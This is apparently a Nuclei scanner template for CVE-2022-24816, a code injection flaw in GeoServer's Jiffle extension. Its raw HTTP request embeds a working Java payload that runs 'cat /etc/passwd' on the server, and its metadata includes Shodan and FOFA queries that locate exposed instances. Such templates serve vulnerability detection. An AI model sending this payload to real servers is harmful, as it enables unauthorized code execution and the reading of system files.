http:
- matchers:
  - condition: and
    part: body
    regex:
    - 'root:.*:0:0:'
    - ExceptionInInitializerError
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /geoserver/wms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\
    \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <wps:Execute version=\"1.0.0\"\
    \ service=\"WPS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"\
    http://www.opengis.net/wps/1.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs\" xmlns:wps=\"\
    http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\"\
    \ xmlns:gml=\"http://www.opengis.net/gml\" xmlns:ogc=\"http://www.opengis.net/ogc\"\
    \ xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\
    \ xsi:schemaLocation=\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\"\
    >\n    <ows:Identifier>ras:Jiffle</ows:Identifier>\n    <wps:DataInputs>\n   \
    \   <wps:Input>\n        <ows:Identifier>coverage</ows:Identifier>\n        <wps:Data>\n\
    \          <wps:ComplexData mimeType=\"application/arcgrid\"><![CDATA[ncols 720\
    \ nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>\n\
    \        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>script</ows:Identifier>\n\
    \        <wps:Data>\n          <wps:LiteralData>dest = y() - (500); // */ public\
    \ class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader\
    \ reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"\
    cat /etc/passwd\").getInputStream())); String line = null; String allLines = \"\
    \ - \"; while ((line = reader.readLine()) != null) { allLines += line; } throw\
    \ new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>\n\
    \        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>outputType</ows:Identifier>\n\
    \        <wps:Data>\n          <wps:LiteralData>DOUBLE</wps:LiteralData>\n   \
    \     </wps:Data>\n      </wps:Input>\n    </wps:DataInputs>\n    <wps:ResponseForm>\n\
    \      <wps:RawDataOutput mimeType=\"image/tiff\">\n        <ows:Identifier>result</ows:Identifier>\n\
    \      </wps:RawDataOutput>\n    </wps:ResponseForm>\n  </wps:Execute>\n"
id: CVE-2022-24816
info:
  author: mukundbhuva
  classification:
    cpe: cpe:2.3:a:geosolutionsgroup:jai-ext:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-24816
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
    epss-percentile: 0.99886
    epss-score: 0.9402
  description: 'Programs run on GeoServer before 1.2.2 which use jt-jiffle and allow
    Jiffle script to be provided via network request are susceptible to remote code
    execution. The Jiffle script is compiled into Java code via Janino, and executed.
    In particular, this affects downstream GeoServer 1.1.22.

    '
  impact: 'Successful exploitation of this vulnerability allows an attacker to execute
    arbitrary code on the target system.

    '
  metadata:
    fofa-query:
    - app="GeoServer"
    - app="geoserver"
    max-request: 1
    product: jai-ext
    shodan-query: /geoserver/
    vendor: geosolutionsgroup
    verified: true
  name: GeoServer <1.2.2 - Remote Code Execution
  reference:
  - https://www.synacktiv.com/en/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver.html
  - https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx
  - https://github.com/geosolutions-it/jai-ext/commit/cb1d6565d38954676b0a366da4f965fef38da1cb
  - https://nvd.nist.gov/vuln/detail/CVE-2022-24816
  - https://github.com/tanjiti/sec_profile
  remediation: 1.2.22 contains a patch that disables the ability to inject malicious
    code into the resulting script. Users unable to upgrade may negate the ability
    to compile Jiffle scripts from the final application by removing janino-x.y.z.jar
    from the classpath.
  severity: critical
  tags: cve,cve2022,geoserver,rce,geosolutionsgroup,kev,vkev,vuln
